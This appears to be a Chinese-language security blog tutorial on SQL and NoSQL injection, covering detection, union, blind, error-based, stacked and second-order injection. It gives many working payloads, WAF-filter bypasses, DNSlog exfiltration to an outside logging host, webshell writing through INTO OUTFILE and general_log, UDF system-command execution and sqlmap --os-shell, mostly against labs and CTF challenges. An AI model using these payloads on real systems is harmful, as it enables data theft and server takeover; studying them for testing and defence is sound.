# 常见安全漏洞-SQL注入


SQL注入相关基础知识

<!--more-->

## 1、数据库基础知识

### 1.1 定义

{{< admonition info>}}

数据库是一个存储数据的仓库，

以一定方式存储在一起、能与多个用户共享、具有尽可能小的冗余度，与应用程序彼此独立的数据集合

{{< /admonition >}}

### 1.2 分类

**关系型数据库-SQL**

{{< admonition info>}}

类似表格，表与表之前存在复杂的关系

举例：MySQL、SQLServer

{{< /admonition >}}

**非关系型数据库 - NoSQL**

{{< admonition info>}}

Key - Value 形式，简化数据库结构、避免冗余。

举例：MangoDB、Redis、memcached

{{< /admonition >}}

### 1.3 相关知识

```sql
--查看数据库
show databases();
--使用数据库
use information_schema
--查看当前使用数据库
select database();
--查看数据表
show tables();
--查看数据库版本
select version();
--使用当前数据库的用户
select user();
--查看数据库路径
select @@datadir
--查看安装路径
select @@basedir
--查看系统类型
select @@version_compile_os
```

### 1.4 information-shcema

{{< admonition >}}

mysql 5.0版本以下不存在information_schema

{{< /admonition >}}

{{< admonition info >}}

是信息数据库其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表的数据类型与访问权限等。对于 Web 渗透过程中用途很大

**SCHEMATA** 表：提供了当前 MySQL 实例中所有数据库的信息。是 show databases 的结果取之此表。

<img src="https://s1.vika.cn/space/2023/03/30/9659cbfd083b4980b31e325b47f86ea5" style="zoom: 67%;" />

**TABLES** 表：提供了关于数据库中的表的信息(包括视图)。

<img src="https://s1.vika.cn/space/2023/03/30/92b2a3de224a43be88466d98ebce6656" style="zoom: 67%;" />

**COLUMNS** 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。

<img src="https://s1.vika.cn/space/2023/03/30/ab7b11b5d0f54044a95110bc9fa6c502" style="zoom: 67%;" />

{{< /admonition >}}

## 2、SQL注入

### 2.1 定义

Web 程序代码中对于用户提交的参数未做过滤就直接放到 SQL 语句中执 行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执 行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以 及绕过登录限制等

{{< admonition type=tip title="形成原因">}}

- 用户能够控制传参
- SQL 语句中拼接了用户传参的内容
- 拼接后的 SQL 语句在数据库中执行

{{< /admonition >}}

{{< admonition abstract >}}
总之：将用户输入的数据作为代码带入数据库执行
{{< /admonition >}}

### 2.2 注入分类

- 布尔型注入
- 联合查询注入
- 时间延迟注入
- 报错型注入
- 堆叠注入

## 3、判断SQL注入

### 3.1 判断是否存在sql注入

`https://127.0.0.1/SQL.php?id=1'`

如果页面返回错误，则存在 SQL 注入；原因是无论字符型还是整型都会因为单引号个数不匹配而报错

### 3.2 判断注入类型

{{< admonition abstract >}}
数字型：

构造url

`https://127.0.0.1/SQL.php?id=1 and 1=1`

`https://127.0.0.1/SQL.php?id=1 and 1=2`

查看结果是否相同，若1=1正常返回信息；1=2没有正常返回信息则证明存在数字型注入

{{< /admonition >}}

{{< admonition abstract >}}
字符型：

构造url

`https://127.0.0.1/SQL.php?id=1' and '1'='1'`

`https://127.0.0.1/SQL.php?id=1' and '1'='2'`

查看结果是否相同，若'1'='1'正常返回信息；'1'='2'没有正常返回信息则证明存在数字型注入

{{< /admonition >}}

### 3.3 SQL 数据库的类型

#### 3.3.1 通过报错信息

- MySQL

> you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near ” at line x

- Access

> Microsoft JET Database…

- MSSQL

> Microsoft ODBC Database…

#### 3.3.2 数据库标志性信息

**sql server**：`select @@version--`

**Oracle**：`select banner from v$version`

**mysql**：`select @@version，version()-- ，length(user)>0正常`

**postgresql**：`select version()--`

#### 3.3.3 数据库特有库名

**MySQL**：information_schema

**Access**：mysysobjects

**Oracle**：sys.user_tables

**MSSQL**：sysobjects

#### 3.3.4 数据库特有函数

**sql server**：@@pack_received @@rowcount

**mysql**：connection_id()、last_insert_id()、row_count()

**orcale**：bitand(1,1)

**postgresql**： select extract(dow from now())

在 mssql 中可以调用 substring。oracle 则只可调用 substr

#### 3.3.5 字符串处理方式

**mssql**：`id=1 and 'a'+'b'='ab'`

**mysql**：`id=1 and 'a'+'b'='ab' ， 'ab'=concat('a','b')`

**oracle**：`id=1 and 'a'+'b'='a'||'b' ，'ab'=concat('a','b')`

**postgresql**：`id=1 and 'a'+'b'='a'||'b' ,'ab'=concat('a','b')`

#### 3.3.6 特殊符号及注释

1. `null` 和 `%00` 是 access 支持的注释
2. `#` 是 MySQL 中的注释符，返回错误说明该注入点可能不是 MySQL，另外也支持`--`，和 `/* */` 注释
3. `--` 和 `/* */` 是 Oracle，SQL server 和 MySQL 支持的注释符，如果正常，说明可能就是这三个数据库其中之一。
4. `;` 是子句查询标识符，在 Oracle 中不支持多行查询，返回错误，很可能是 Oracle 数据库。

## 4、联合查询注入

### 4.1 原理

{{< admonition info>}}
union操作用于合并两个查询或者多个select语句的结果集

TIP：union内部的select语句必须有相同数量的列，当不同时不能正常执行会出现报错信息

<img src="https://s1.vika.cn/space/2023/03/31/3155fad5e12943cd8caf931c0358777c" style="zoom:67%;" />

{{< /admonition >}}

### 4.2 常用语句

```sql
--库名
union select 1,group_concat(schema_name),3 from information_schema.schemata
union select 1,(select schema_name from information_schema.schemata limit 0,1),3
--表名
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'
--列名
union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='emails'
--数据
union select 1,group_concat(id,email_id),3 from security.emails
```

## 5、时间型盲注&布尔型盲注

盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施 SQL 注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。

{{< admonition abstract >}}**时间型**：通过注入特定语句，根据页面请求的物理反馈，来判断是否注入成功，如：在 SQL 语句中使用 sleep() 函数看加载网页的时间来判断注入点。

**布尔型**：页面只返回 True 和 False 两种状态(类型)页面。利用页面返回不同，逐个猜解数据。

{{< /admonition >}}

### 5.1 原理示意

```
select * from user where id = '?'
?` 为用户输入，替代为：`4' and sleep(3)#
```

实际执行的 SQL 语句：`select * from user where id = '4' and sleep(3)#`

当 ID = 4 存在时，sleep 3 秒

当 ID = 4 不存在时，直接返回

整条拼接出来的 SQL 是正确的就执行 sleep，前面错误（不存在），sleep(3) 不执行

### 5.2 常用函数

#### 5.2.1 编码转换函数

`ord('a')`：将字符转化为 ascii 码

`ascii('a')`：将字符转化为 ascii 码

`char(97)`：将 ascii 转化为字符

#### 5.2.2 条件判断函数

`if(exp1, exp2, exp3)`：exp1 成立，执行 exp2，否则执行 exp3。

case when then 函数：`select case when username="admin" then sleep(1) else "error" end from wp_user_`

#### 5.2.3 截取函数

**substr 函数**

`substr(str, pos, len)`：从 pos 位置开始，截取字符串 str 的 len 长度

`substr(str from pos for length)` ：可以用在过滤了 `,` 的情况

**substring 函数**

`substring(str, pos, len)`：从 pos 位置开始，截取字符串 str 的 len 长度

`substring(str from pos for length)` ：可以用在过滤了 `,` 的情况

注意：pos 从 1 开始

```sql
id=1 and if(ord(substr(database(),1,1))=116,1,0)%23
select substring(database(), from 1 for 1)
select substring(database(), 0, 1)
```

**mid 函数**

`mid(str, pos, length)`
`mid(str from pos for length)`

```sql
select mid(database(), from 1 for 1)
select mid(database(), 1, 1)
```

**left 函数**

从左开始截取字符串

`left(str, len)`

```sql
select left(database(), 1) 
```

**right 函数**

从右开始截取字符串

`right(str, len)`

**利用正则表达式逐位匹配**

```sql
select * from wp_user_ where password rlike "^1"
select * from wp_user_ where password REGEXP "^1"
select * from wp_user_ where password REGEXP "^12"
...
```

#### 5.2.4 延时函数

`sleep(n)`：程序挂起 n 秒

```sql
if(ascii(substr(database() from 0))=97, sleep(3),0)
```

`benchmark(count, sha(1))`：执行 sha(1) 函数 count 次达到延时的目的

```sql
SELECT BENCHMARK(10000000, sha(1))
```

利用笛卡尔积制造延时：

```sql
SELECT count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C;
```

**实际测试使用information_schema.columns并不稳定，对于不同的网站效果不同，太少会没有明显延时效果，太多则会导致数据库崩溃**

使用`character_sets`（41行）和`collations`（222行）效果可能会好点，因为数据量相对计较统一

利用正则表达式匹配长字符串制造延时：

```sql
select * from wp_user_ where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0)
```

#### 5.2.5 其它函数

`count()`：计算总数

`length()`：返回字符串的长度

## 6、盲注的加速方式

{{< admonition info >}}

1、利用DNSlog加速注入(windows平台)

2、利用二分法加速注入

{{< /admonition >}}

### 6.1 DNSlog注入

#### 基本原理

<img src="https://s1.vika.cn/space/2023/04/01/3ac876b9b1a6472d9ecadd492edc24b1" style="zoom:80%;" />

除了了解基本原理，还要了解两个概念UNC路径、secure_file_priv和必备条件

{{< admonition title=必备条件 >}}

1、MYSQL开启load_file()

2、Windows平台

3、DNSlog平台

{{< /admonition >}}

#### UNC路径

{{< admonition question >}}

什么是UNC路径？

UNC路径就是类似 \\\softer 这样的形式的网络路径

例子：`\\www.test.com\abc.txt`

不过也可以这样写`//www.test.com/abc.txt 推荐`

tip: 读取远程文件就要用到UNC路径

{{< /admonition >}}

#### secure_file_priv

secure_file_priv的值，默认为NULL，可选项如下：

- secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。
- secure_file_priv 为 /tmp 时，表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。
- secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。

#### load_file函数

使用案例：`select load_file('D:/1.txt') as result;`读取D盘中的1.txt文件内容：load file test

{{< admonition >}}

使用该函数必须有权限读取并且文件必须完全可读

{{< /admonition >}}

<img src="https://s1.vika.cn/space/2023/04/01/ec607759342d4a36a644737b486d4c91"/>

#### DNSlog盲注实例

以sql-labs题目的第八题为例：

<img src="https://s1.vika.cn/space/2023/04/01/f47558521b30421b896be34f2c1e8395" style="zoom: 67%;" />

```sql
--获取当前数据库名
http://localhost/sqli-labs/Less-8/?id=1' and load_file(concat('//',database(),'.0e9cc54a.ipv6.1433.eu.org/a'))--+
--获取表名
http://localhost/sqli-labs/Less-8/?id=1' and load_file(concat('//',(select table_name from information_schema.tables where table_schema='security' limit 3,1),'.0e9cc54a.ipv6.1433.eu.org/a'))--+
--后续的步骤与手动注入类似
```

下图是获取到的表名：

<img src="https://s1.vika.cn/space/2023/04/01/a8050e2c2e8f46ac9b35a39d659a8f2e" style="zoom:80%;" />

{{< admonition title=注意事项 >}}

1、由于每一级域名的长度只能为63个字符，长度过长时需要截断获取

2、因为存在特殊符号时无法解析所以常对查询内容使用hex编码

3、Linux服务器没有unc路径，也就无法使用dnslog注入

4、读取文件必须小于`max_allowed_packet`

{{< /admonition >}}

## 7、报错型注入

### 7.1 原理

> 用于使用 SQL 语句报错的语法，用于注入结果无回显，但显示错误信息有输出的情况
>
> 返回的信息即是攻击者需要的信息

MySQL 报错注入主要分为以下几类：

1. BigInt 等数据类型溢出
2. Xpath 语法错误
3. count() + rand() + group by 导致主键重复
4. 空间数据类型函数错误

### 7.2 常用函数

#### 7.2.1 updatexml

> updatexml 第二个参数需要传入的是 Xpath 格式的字符串。输入不符合，将参数值返回并报错。
>
> 报错长度最大为 32 位

```sql
--显示当前数据库
updatexml(1,CONCAT(0x7e, database()),1)

--显示所有数据库
updatexml(1,CONCAT(0x7e,(select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit x,1), 0x7e),1)

--获取表名
updatexml(1,CONCAT(0x7e,(select table_name from information_schema.tables where table_schema="sectest" limit x,1), 0x7e),1)

updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)
--获取列名
updatexml(1,CONCAT(0x7e,(select column_name from information_schema.COLUMNS where table_name="wp_user_" limit 1,1), 0x7e),1)

updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name="users")),1)

--获取数据
updatexml(1,CONCAT(0x7e,(select username from wp_user_ limit 0,1), 0x7e),1)

updatexml(1,CONCAT(0x7e,(select password from wp_user_ where username="admin" limit 0,1), 0x7e),1)

updatexml(1,CONCAT(0x7e,(select GROUP_CONCAT(username, 0x3a, password) from wp_user_ where id=1), 0x7e),1)

updatexml(1,make_set(3,'~',(select data from users)),1)#
```



#### 7.2.2 floor 显错注入

```sql
and (select 1 from (select count(*), concat(user(), floor(rand(0)*2))x from information_schema.tables group by x)a)

and (select 1 from (select count(*), concat((select group_concat(username,0x3a,password) from wp_user_ where id=1), floor(rand(0)*2))x from information_schema.tables group by x)a)
```

#### 7.2.3 其它显错注入

```sql
and extractvalue(1,concat(0x7e,(select database())))
//1105 - XPATH syntax error: '~sectest', Time: 0.000000s

and exp(~(select * from (select user())a)) // mysql5

union select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a;
//1060 - Duplicate column name '5.7.23', Time: 0.000000s
```

## 8、堆叠注入

多条 SQL 语句一起执行。在 MySQL 中，每条语句结尾加 `;` 表示语句结束。这样可以考虑多条 SQL 语句一起使用

{{< admonition question >}}

堆叠注入和 UNION 注入的差别是？

UNION 执行的语句类型是有限的，只可以用来执行查询语句而堆叠注入可以执行任意语句

{{< /admonition >}}



并不是每一个环境下都可以执行，很可能受 API 或者数据库引擎不支持的限制，同时权限不足也是面临的主要问题

在真实环境中：

1. 通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的
2. 在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息

在 PHP - MySQL 中相关的 API

```php
$query  = "SELECT CURRENT_USER();";
$query .= "SELECT Name FROM City ORDER BY ID LIMIT 20, 5";

/* 批量执行查询 */
if ($mysqli->multi_query($query)) {
    do {
        /* store first result set */
        if ($result = $mysqli->store_result()) {
            while ($row = $result->fetch_row()) {
                printf("%s\n", $row[0]);
            }
            $result->free();
        }
        /* print divider */
        if ($mysqli->more_results()) {
            printf("-----------------\n");
        }
    } while ($mysqli->next_result());
}
```

## 9 WAF 绕过

### 9.1 and 和 or 绕过

过滤代码：`preg_match('/(and|or)/i', $id)`

绕过：利用 `||` 代替 `or`，`&&` 代替 `and`

### 9.2 union 过滤绕过

过滤代码：`preg_match('/(and|or|union)/i', $id)`

绕过：

```sql
|| (select user from users where user_id=1)='admin'
```

{{< admonition question >}}

怎么知道 user 表、user 列、admin 字段？

1. 表名确实可以猜解，尤其是 user 这种常用表
2. 如果猜不到，通过 `information_schema.tables` 及 `substr` 来联合判断
3. 列名和字段内容也是同理

{{< /admonition >}}

### 9.3 where 过滤绕过

过滤代码：`preg_match('/(and|or|union|where)/i', $id)`

绕过：`|| (select user from users limit 1,1)='admin'`

### 9.4 limit 过滤绕过

过滤代码：`preg_match('/(and|or|union|where|limit)/i', $id)`

绕过：`|| (select min(user) from group by user_id having user_id=1 ='admin'`

### 9.5 group by 过滤绕过

过滤代码：`preg_match('/(and|or|union|where|limit|group by)/i', $id)`

绕过：

```sql
||(select substr((select group_concat(name)name from test), 1, 1))='t'
```

### 9.6 select 及单引号过滤绕过

过滤代码：`preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)`

绕过：

布尔盲注不需要 select

```sql
|| substr(name,1,1)=0x74 || substr(name,1,1)=unhex(74)
```

### 9.7 hex、unhex 及 substr 过滤绕过 - binary

过滤代码：`preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr)/i', $id)`

绕过：

```sql
|| binary(name) = 0x74657374
```

### 9.8 空格过滤绕过

过滤代码：`preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr|\s)/i', $id)`

绕过：注释符代替空格

### 9.9 等号过滤绕过

过滤代码：`preg_match('/(and|or|union|where|limit|group by|select|\'|hex|unhex|substr|\s| =)/i', $id)`

绕过：利用 `like、rlike、regexp、!(username<>"admin")(table_name<>'ffll44jj')` 代替等号

### 9.10 其它类型的绕过

- 双写绕过
- 双重编码绕过



## 10、二次注入

### 10.1 原理

<img src="https://s1.vika.cn/space/2023/04/01/40584478ee424d90ba5ab7af6fd7d99e" style="zoom:80%;" />

### 10.2 实例

```sql
--注册账号，输入我们的账号密码，账号设置成admin'#,密码随意，admin'#被存进数据库
--当我们修改admin'#的密码时执行的sql语句是
update users set password='$new_pass' where username='admin'# and password='$old_pass';
--这时候 and 条件被注释掉，我们随意输入密码就达到了，修改admin账户密码的目的
```

## 11、SQL 注入命令执行

### 11.1 SQL 注入写文件

通过 SQL 注入，直接写入 webshell 文件到服务器，通过 GET 方法或者 POST 方法提交并执行外部指令，为后续进一步远程控制，提权，创造条件。

{{< admonition>}}

需要 mysql 用户在写入文件夹下有写入权限，即 `secure_file_priv` 为不为空

- 在 MySQL 5.5.3 之前 `secure_file_priv` 默认是空，这个情况下可以向任意绝对路径写文件
- 在 MySQL 5.5.3 之后 `secure_file_priv` 默认是 NULL，这个情况下不可以写文件

{{< /admonition >}}

当`secure_file_priv` 不为空时，可以使用 general_log 写文件：

```sql
set global general_log = on;
set global general_log_file = 'D:/webshell.php';
select '<?php eval($_POST['key']) ?>';
```

#### 11.1.1 union select 后写入

```sql
select username, password from users where id="1" union select null,'<?php @eval($_REQUEST[1]);?>' into outfile '/var/www/html/webshell.php'
```

**注意**：在 windows 下的分隔符为 /（斜杠）。

#### 11.1.2 行分隔符写入

lines terminated by 在每行终止的位置添加 xx 内容

lines starting by 以每行开始的位置添加 xx 内容

fields terminated by 以每个字段的位置添加 xx 内容

COLUMNS terminated by 以每个字段的位置添加 xx 内容

```sql
--lines terminated by 写入
?id=1 limit 1 into outfile 'C:/wamp64/www/work/webshell.php' lines terminated by '<?php phpinfo() ?>';

--lines starting by 写入
?id=1 limit 1 into outfile 'C:/wamp64/www/work/webshell.php' lines starting by '<?php phpinfo() ?>';

--fields terminated by 写入
?id=1 into outfile 'C:/wamp64/www/work/webshell.php' fields terminated by '<?php phpinfo() ?>';

--COLUMNS terminated by 写入
?id=1 limit 1 into outfile 'C:/wamp64/www/work/webshell.php' COLUMNS terminated by '<?php phpinfo() ?>';
```



### 11.2 用户自定义函数 - UDF

还可以利用「用户自定义函数」的方式，即 User Defined Functions(UDF) 来执行命令。通过 lib_mysqludf_sys 提供的函数可以执行**系统命令**关键语句:

- sys_eval()，执行任意命令，并将输出返回
- sys_exec()，执行任意命令，并将返回码返回
- sys_get()，获取一个环节变量
- sys_set()，创建或修改一个环境变量

#### 11.2.1 UDF 库文件获取

https://github.com/mysqludf/lib_mysqludf_sys

sqlmap/data/udf/mysql/

sqlmap 下的文件经过编码，需要使用 sqlmap/extra/cloak 目录下的 cloak.py 文件进行解码

```bash
# 解码文件
python cloak.py -d -i /path/to/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_linux.so
```

#### 11.2.2 UDF 库文件写入

将 so 文件转成 16 进制，以 16 进制编码形式写入

```sql
select unhex('???') into dumpfile '/usr/lib/mysql/plugin/lib_linux.so'
```

#### 11.2.3 dumpfile vs. outfile

若我们想把一个可执行 2 进制文件用 into outfile 函数导出事实上导出后就会被破坏。

因为 into outfile 函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个 2 进制可执行文件就会被破坏。

这时候我们用 into dumpfile 就能导出一个完整能执行的 2 进制文件 into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理。

#### 11.2.4 自定义函数

```sql
create function sys_eval returns string soname "lib_linux.so";
select sys_eval('ifconfig');
```

### 11.3 自动化工具

```bash
sqlmap -u "url" --os-shell
sqlmap -u "url" --os-cmd=ifconfig
```

## 12、注入技巧

从 SQL 语法角度，从不同的注入点位置说明 SQL 注入的技巧

### 12.1 SELECT 注入

> select 语句用于数据表记录的查询，常在界面展示的过程中使用

#### 12.1.1 注入点在 select_expr

源代码如下所示：

```php
<?php
    $conn = mysqli_connect("127.0.0.1", "root", "root", "test");
	$res = mysqli_query($conn, "SELECT ${_GET['id']}, content FROM wp_news");
	$row = mysqli_fetch_array($res);
	echo "$row['title']";
	echo "$row['content']";
?>
```

可以采取时间盲注的方式，但是根据 MySQL 的语法，有更优的解决方法，即利用 AS 别名的方法，直接将查询的结果显示到界面中。

**payload**：`?id=(select pwd from wp_user as title)`

#### 12.1.2 注入点在 table_reference

上文的 SQL 查询语句改为：`$res = mysqli_query($conn, "SELECT title FROM ${_GET['table']}");`

仍然可以利用别名的方式直接取出数据

```
select title from (select pwd AS title from wp_user)x
```

{{< admonition>}}

在不知表名的情况下，可以先从 information_schema.tables 中查询表名。

在 select_expr 和 table_reference 的注入，如果注入的点有反引号包裹，那么需要先闭合反引号。

{{< /admonition >}}

#### 12.1.3 注入点在 WHERE 或 HAVING 后

SQL 语句：`$res = mysqli_query($conn, "SELECT title FROM wp_news WHERE id=${_GET[id]}")`

实战中最常遇到的情况，要先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。注入点在 HAVING 后的情况与之相似。

#### 12.1.4 注入点在 GROUP BY 或 ORDER BY 后

##### 12.1.4.1 利用报错

```sql
select * from wp_user_ order by 1|updatexml(1,concat(0x7e,database(),0x7e),0)
```

1105 - XPATH syntax error: ‘~sectest~’, Time: 0.000000s

##### 12.1.4.2 利用延时

```php
$res = mysqli_query($conn, "SELECT title FROM wp_news GROUP BY ${_GET['title']}");
```

经过测试可以发现，`?title=id desc,(if(1，sleep(1),1))` 会让页面迟 1 秒，于是可以利用时间注入获取相关数据。

{{< admonition>}}

该方法只能用在 mysql 5 上，mysql 8 上失效

{{< /admonition >}}

##### 12.1.4.3 利用 & | ^ 位运算符进行 order by

```sql
--布尔型盲注
select * from wp_user_ order by id|(if(1,2,1))

--id 和 if 返回的结果进行按位与进行 order by 根据时间判断

select * from wp_user_ order by 1|if(database() regexp "sectest",sleep(1),0)
```

##### 12.1.4.4 利用括号闭合进行联合查询

前提是前句查询必须带有括号。

`(select * from person order by 1) union (select 1,2,3)`

**Demo**

https://chall.tasteless.eu/level1/index.php?dir=asc

payload: `?dir=,3)union(select%201,flag%20from%20level1_flag)%23`

#### 12.1.5 注入点在 LIMIT 后

LIMIT 后的注入判断比较简单，通过更改数字大小，页面会显示更多或者更少的记录数。由于语法限制，前面的字符注入方式不可行（LIMIT 后只能是数字），在整个 SQL 语句没有 ORDER BY 关键字的情况下，可以直接使用 UNION 注入。

另外，可根据 SELECT 语法，通过加入 PROCEDURE 来尝试注入，这类语句只适合 MySQL 5.6 前的版本，

`select id from wp_news limit 2 procedure analyse(extractvalue(1,concat(0x7e,version())),1)`

也可以进行时间盲注

`procedure analyse((select extractvalue(1,concat(0x3a,(if(mid(version(),1,1) LIKE 5, BENCHMARK(500000, SHA(1)), 1))))),1)`

也可以直接写文件 `into outfile`

### 12.2 INSERT 注入

通常，注入位于字段名或者字段值的地方，且没有回显信息

#### 12.2.1 注入点位于 table_name

如果能够通过注释符注释后续语句，则可直接插入特定数据到想要的表内，如管理员表。例如，对于如下 SQL 语句：

`$res = mysqli_query($conn, "INSERT INTO {$_GET['table']} VALUES(2,2,2,2)");`

开发者预想的是，控制 table 的值为 wp_news，从而插入新闻表数据。由于可以控制表名，可以访问 `?table=wp_user values(2，'newadmin'，'newpass')%23`，直接插入管理员。

#### 12.2.2 注入点位于 VALUES

##### 12.2.2.1 INSERT 延时

```sql
INSERT into wp_user_ (username,password,year) VALUES("test1","122","3" and sleep(1))

INSERT into wp_user_ (username,password,year) VALUES("test1","122","3" & sleep(1))

INSERT into wp_user_ (username,password,year) VALUES("test1","122","3" | sleep(1))
```

##### 12.2.2.2 INSERT 报错

```sql
INSERT into wp_user_ (username,password,year) VALUES("test1","122"or updatexml(1,concat(0x7e,DATABASE()),0),1)

INSERT into wp_user_ (username,password,year) VALUES("test1","122"and updatexml(1,concat(0x7e,DATABASE()),0),1)

INSERT into wp_user_ (username,password,year) VALUES("test1","122"&updatexml(1,concat(0x7e,DATABASE()),0),1)

INSERT into wp_user_ (username,password,year) VALUES("test1","122"|updatexml(1,concat(0x7e,DATABASE()),0),1)

INSERT into wp_user_ (username,password,year) VALUES("test1","122"+updatexml(1,concat(0x7e,DATABASE()),0),1)

```

result: 1105 - XPATH syntax error: ‘~sectest’, Time: 0.000000s

**Demo**

http://chall.tasteless.eu/level15/

payload

```sql
insert into tables values ('\',',(select flag from level15_flag))# ')
```

- name: `\`
- text: `,(select flag from level15_flag))#`

### 12.3 UPDATE 注入

#### 12.3.1 UPDATE 报错

```sql
update wp_user_ set password="zxczxcxzc"or updatexml(1,concat(0x7e,database()),1) where id=9

update wp_user_ set password="zxczxcxzc"or(updatexml(1,concat(0x7e,database()),1)) where id=9

```

#### 13.3.2 UPDATE 延时

```sql
update wp_user_ set password="2" and sleep(1) where id=9

update wp_user_ set password="00000000" and if((LENGTH(database())=8),sleep(1),0) where id=9
--password处必须为数字型
```

### 12.4 DELETE 注入

#### 12.4.1 DELETE 延时

```sql
delete from wp_user_ where id=21 or/and(sleep(2))

delete from wp_user_ where id=21 and if((LENGTH(database()=7)),sleep(2),0)
```

#### 13.4.2 DELETE 报错

```sql
delete from wp_user_ where id=21 and updatexml(1,concat(0x7e,database()),1)
```

### 13.5 DESCIBE 注入

> {DESCRIBE | DESC} table_name [col_name | wild]
>
> DESCRIBE 提供有关一个表的列信息。col_name 可以是一个列名或是一个包含 SQL 通配符字符 `%`和 `_` 的字符串。

源代码：

```php
<?php
require("config.php");
$table = $_GET['table']?$_GET['table']:"test";
$table = Filter($table);
mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
$sql = "select 'flag{xxx}' from secret_{$table}";
$ret = sql_query($sql);
echo $ret[0];
?>
```

desc 可以接受两个参数，可以过掉第一个检测。

反引号在 union select 中可以当做空格。

payload:

?table=test`` union select database() limit 1 offset 1

## 13、NoSQL 注入

### 13.1 定义

泛指非关系型的数据库。随着互联网 web2.0 网站的兴起，在高可用，高并发压力下，传统数据库已经不能满足需求，用于解决大数据应用和超大规模数据存储的问题。

主要代表：MongDB、 Redis、 Memcache

以 MongDB 为例，它是一个面向文档存储的数据库，以键值对形式存在

```json
{
  "name": "xunruo",
  "age": 26,
  "status": "A",
  "groups": ["news", "sports"]
}
```

### 13.2 注入原理一

1. 注入过程

以用户身份验证为例，POST 请求：

```
username=test&password=123456
```

后端程序语言，我们希望是这样的：

```
db.users.find({username: 'test', password: '123456'})
```

因此，我们可以构造如下请求：

```
username[$ne]=1&password[$ne]=1
```

实际后端程序运行：

```
db.logins.find({username:{$ne:1}, password:{$ne:1}})
```

类比传统 SQL 语句：

```
select * from logins where username <> 1 and password <> 1
```

### 13.3 注入原理二

如果在编程语言中不够谨慎，也可能产生像 sqli 注入那样的截断问题，但是这是在程序语言中而非 SQL 语句中：

```javascript
$script= "try{
	var key = db.users.find({username: 'test'}).value;
	var inputValue = '".$input."';
	if(key == inputValue) {
		return('match');
}}";
```

当输入 `';return key;//` -> `var inputValue='';return key;//'`，导致 inputValue 为空，直接返回 key 字段





参考文章：
{{< link "https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/" "SQl注入相关知识" "" false >}}


---

> 作者: [xunruo](https://xunruo.top)  
> URL: https://xunruo.top/post/9a9550e5/  

